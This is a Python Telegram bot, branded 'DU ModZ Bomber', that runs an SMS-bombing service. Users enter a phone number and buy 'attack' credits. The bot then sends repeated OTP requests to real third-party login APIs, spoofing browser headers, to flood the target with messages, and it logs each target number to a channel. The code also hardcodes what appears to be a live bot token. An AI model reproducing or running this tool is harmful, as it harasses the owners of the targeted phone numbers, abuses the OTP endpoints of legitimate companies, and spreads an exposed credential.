import telebot
import requests
import json
import os
import time
import threading
import random
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস সিস্টেম ---
def load_db(file):
    try:
        if os.path.exists(file):
            with open(file, 'r') as f:
                return json.load(f)
    except: pass
    return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

users = load_db('users.json')
keys = load_db('keys.json')

# --- লগিং ফাংশন ---
def send_log(text):
    try:
        bot.send_message(LOG_CHANNEL, f"📜 **[SYSTEM LOG]**\n⏰ {datetime.now().strftime('%H:%M:%S')}\n\n{text}")
    except Exception as e:
        print(f"Log Error: {e}")

# --- জয়েন চেক ---
def is_joined(user_id):
    if user_id == ADMIN_ID: return True
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# --- ইউজার আপডেট (ডাটা ক্লিয়ার করলেও কয়েন হারাবে না) ---
def update_user(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active",
            "coins": 50,
            "sent": 0
        }
        save_db('users.json', users)
        send_log(f"🆕 **New User:** {user.first_name}\n🆔 ID: `{uid}`")
    return users[uid]

# --- কমান্ড: Start ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    u = update_user(message.from_user)
    
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}"))
        markup.add(types.InlineKeyboardButton("🔄 Verify & Start", callback_data="start_over"))
        bot.send_message(message.chat.id, "⚠️ **Please join our channel first to use this bot!**", reply_markup=markup)
        return

    if u['status'] == "Blocked":
        bot.send_message(message.chat.id, "🚫 **Account Blocked!**\nContact admin for help: @DarkUnkwon")
        return

    show_main_menu(message.chat.id, u)

def show_main_menu(chat_id, u):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Attack SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Use Key", callback_data="recharge"),
        types.InlineKeyboardButton("📊 Live Status", callback_data="status_live")
    )
    
    text = (
        f"👑 **Welcome to DU ModZ Bomber**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name: `{u['name']}`\n"
        f"💎 Status: `{u['status']}`\n"
        f"💰 Balance: `{u['coins']} Coins`\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_photo(chat_id, LOGO_URL, caption=text, reply_markup=markup)

# --- অ্যাডমিন প্যানেল (১০০% নিখুঁত) ---
@bot.message_handler(commands=['admin'])
def admin_menu(message):
    if message.from_user.id != ADMIN_ID: return
    
    help_text = (
        "👑 **Admin Control Panel**\n\n"
        "📊 `/stats` - চেক সিস্টেম ওভারভিউ\n"
        "👥 `/users` - সকল ইউজার লিস্ট\n"
        "⚙️ `/setstatus [ID] [Status]` - (Blocked/Lifetime/Active)\n"
        "💰 `/addcoins [ID] [Amount]` - কয়েন অ্যাড\n"
        "🔑 `/gen [Amount]` - রিচার্জ কি জেনারেট\n"
        "📢 `/broadcast [Msg]` - সবাইকে মেসেজ"
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    total_users = len(users)
    total_sent = sum(u['sent'] for u in users.values())
    bot.reply_to(message, f"📊 **System Stats:**\nTotal Users: `{total_users}`\nTotal SMS Sent: `{total_sent}`")

@bot.message_handler(commands=['setstatus'])
def set_status(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        uid, status = args[1], args[2]
        if uid in users:
            users[uid]['status'] = status
            save_db('users.json', users)
            bot.reply_to(message, f"✅ User `{uid}` status set to `{status}`")
            send_log(f"🛠 Status Updated: `{uid}` -> `{status}`")
        else: bot.reply_to(message, "❌ User not found!")
    except: bot.reply_to(message, "Usage: `/setstatus [ID] [Status]`")

@bot.message_handler(commands=['addcoins'])
def add_coins(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        uid, amt = args[1], int(args[2])
        if uid in users:
            users[uid]['coins'] += amt
            save_db('users.json', users)
            bot.reply_to(message, f"✅ Added `{amt}` coins to `{uid}`")
        else: bot.reply_to(message, "❌ User not found!")
    except: bot.reply_to(message, "Usage: `/addcoins [ID] [Amount]`")

@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amt = int(message.text.split()[1])
        key = "DU-KEY-" + str(random.randint(100000, 999999))
        keys[key] = amt
        save_db('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key Generated:**\n`{key}`\nValue: `{amt} Coins`")
    except: bot.reply_to(message, "Usage: `/gen [Amount]`")

# --- বোম্বিং ইঞ্জিন (অ্যাডভান্সড) ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = str(call.from_user.id)
    u = users.get(uid)

    if call.data == "start_over":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_cmd(call.message)

    elif call.data == "profile":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"👤 **Profile:**\nName: {u['name']}\nCoins: {u['coins']}\nSent: {u['sent']}\nStatus: {u['status']}")

    elif call.data == "bomb":
        if u['status'] == "Blocked":
            bot.answer_callback_query(call.id, "🚫 Blocked!", show_alert=True)
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number:**")
        bot.register_next_step_handler(msg, get_bomb_amount)

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Key:**")
        bot.register_next_step_handler(msg, redeem_key)

def get_bomb_amount(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **How many SMS? (Max 100):**\n_Cost: 5 Coins per SMS_")
        bot.register_next_step_handler(msg, lambda m: process_bomb(m, num))
    else: bot.send_message(message.chat.id, "❌ Invalid Number!")

def process_bomb(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = amount * 5
        
        if users[uid]['status'] != 'Lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, "⚠️ **Low balance! Please recharge.**")
            return

        status_msg = bot.send_message(message.chat.id, "🚀 **Attack Starting...**")
        threading.Thread(target=bomb_logic, args=(uid, num, amount, cost, status_msg)).start()
    except: pass

def bomb_logic(uid, num, amount, cost, status_msg):
    success = 0
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Referer": "https://google.com"
    }
    
    # APIs
    apis = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp",
        "https://pms.al-adwaa.com/api/v1/auth/otp/send"
    ]
    
    for i in range(1, amount + 1):
        try:
            api = random.choice(apis)
            # Payload variations
            res = requests.post(api, json={"phone": num, "number": "+88"+num}, headers=headers, timeout=5)
            if res.status_code == 200: success += 1
            
            if i % 5 == 0 or i == amount:
                progress = "▰" * (i // 10) + "▱" * (10 - (i // 10))
                bot.edit_message_text(f"🚀 **Bombing {num}**\nProgress: `{progress}` {i}/{amount}\n✅ Sent: `{success}`", status_msg.chat.id, status_msg.message_id)
            time.sleep(0.5)
        except: pass

    # Update Data
    if users[uid]['status'] != 'Lifetime':
        users[uid]['coins'] -= (amount * 5) # Deduct for requested amount
    users[uid]['sent'] += success
    save_db('users.json', users)
    
    send_log(f"🔥 **Attack Done:**\nTarget: `{num}`\nSuccess: `{success}`\nUser: `{users[uid]['name']}`")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 Attack Again", callback_data="bomb"))
    bot.edit_message_text(f"✅ **Attack Summary**\n━━━━━━━━━━━━━━\n🎯 Target: `{num}`\n📩 Success: `{success}`\n💰 Coins Left: `{users[uid]['coins']}`", status_msg.chat.id, status_msg.message_id, reply_markup=markup)

def redeem_key(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        val = keys[key]
        users[uid]['coins'] += val
        del keys[key]
        save_db('users.json', users)
        save_db('keys.json', keys)
        bot.send_message(message.chat.id, f"✅ Success! `{val}` coins added.")
    else: bot.send_message(message.chat.id, "❌ Invalid Key!")

# --- রান ---
if __name__ == "__main__":
    print("DU ModZ Pro Bot is running...")
    send_log("✅ **Bot is now Online and Fixed!**")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
